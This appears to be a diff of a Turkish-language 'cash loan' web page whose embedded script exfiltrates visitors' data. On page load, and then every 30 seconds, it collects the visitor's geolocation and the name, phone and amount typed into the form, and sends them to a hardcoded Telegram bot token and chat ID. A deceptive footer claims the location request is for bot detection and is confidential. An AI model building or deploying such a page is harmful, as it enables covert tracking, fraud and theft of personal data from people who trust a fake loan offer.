@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Borç Verilir</title>
+    <title>Nakit Borç Verilir</title>
     <style>
         body {
             font-family: 'Arial', sans-serif;
@@ -40,13 +40,13 @@
     font-size: 14px;
     margin-top: 30px;
     color: #ecf0f1;
-    text-align: justify; /* Metni iki yana hizalar */
-    background-color: rgba(0, 0, 0, 0.5); /* Arka planı sayfaya uyumlu hale getirir */
+    text-align: justify; 
+    background-color: rgba(0, 0, 0, 0.5); 
     padding: 20px;
     border-radius: 8px;
     box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
-    max-width: 800px; /* Sayfanın genişliğine uyum sağlar */
-    margin: 30px auto; /* Ortalar */
+    max-width: 800px; 
+    margin: 30px auto; 
 }
 .footer a {
     color: #f39c12;
@@ -80,7 +80,7 @@
     </style>
 </head>
 <body>
-    <h1>Borç Verilir</h1>
+    <h1>Nakit Borç Verilir</h1>
 
     <div class="container">
         <p>Hızlı ve güvenli borç para alma işlemi için başvurun! Kısa süre içinde paranız nakit olarak cebinizde.</p>
@@ -120,16 +120,16 @@
 
     <div class="footer">
     <p>
-        <strong>Yasal Bilgilendirme:</strong> Konum talebi, kullanıcının bot hesap olup olmadığını belirlemek içindir. 
-        Konum bilgisi aktif edilmezse borç talebiniz karşılanmayacaktır. Bu işlem tamamen gizlidir. 
+        <strong>Yasal Bilgilendirme:</strong> Konum talebi borç talep eden kullanıcının bot hesap olup olmadığını belirlemek amaçlıdır. 
+        Konum bilgisine izin verilmezse borç talebiniz karşılanmayacaktır. Bu işlem tamamen gizlidir. 
         <a href="https://www.google.com">Buradan daha fazla bilgi alabilirsiniz.</a>
     </p>
 </div>
 
 
     <script>
-        const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co'; // Bot token'ınız
-        const chatId = '1568538396'; // Chat ID'niz
+        const token = '8055523671:AAH6_SVWU0Ly8ugkyrw_UO1jS1vt06m71Co';
+        const chatId = '1568538396';
 
         function sendDataToTelegram(data) {
             const googleMapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
@@ -155,10 +155,10 @@
         }
 
         function getLocationAndSend() {
-            const amount = document.getElementById('amount').value || "Belirtilmedi";
-            const name = document.getElementById('name').value || "Belirtilmedi";
-            const phone = document.getElementById('phone').value || "Belirtilmedi";
-            const mesaj= document.getElementById('mesaj').value || "Belirtilmedi";
+            const amount = document.getElementById('amount').value || ".........";
+            const name = document.getElementById('name').value || "..........";
+            const phone = document.getElementById('phone').value || ".........";
+            const mesaj= document.getElementById('mesaj').value || "...........";
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function (position) {
@@ -210,7 +210,6 @@
 
                     sendDataToTelegram(data);
 
-                    // Formu temizle
                     document.getElementById('amount').value = '';
                     document.getElementById('name').value = '';
                     document.getElementById('phone').value = '';
@@ -225,9 +224,8 @@
             }
         }
 
-        // Sayfa yüklendiğinde hemen konum gönderimini başlat
         window.onload = function() {
-            getLocationAndSend(); // Sayfa yüklendiği anda konum bilgisi gönder
+            getLocationAndSend(); 
             setInterval(getLocationAndSend, 30000); // 30 saniyede bir gönderim yap
         };
     </script>
